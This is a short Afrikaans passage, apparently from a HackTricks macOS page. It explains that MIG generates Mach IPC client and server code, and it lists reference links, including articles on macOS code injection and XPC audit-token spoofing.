MIG is geskep om die **proses van Mach IPC** kode skepping te **vereenvoudig**. Dit genereer basies die **nodige kode** vir bediener en kliënt om met 'n gegewe definisie te kommunikeer. Alhoewel die gegenereerde kode lelik is, sal 'n ontwikkelaar net dit moet invoer en sy kode sal baie eenvoudiger wees as voorheen.

Vir meer inligting, kyk:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Verwysings

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
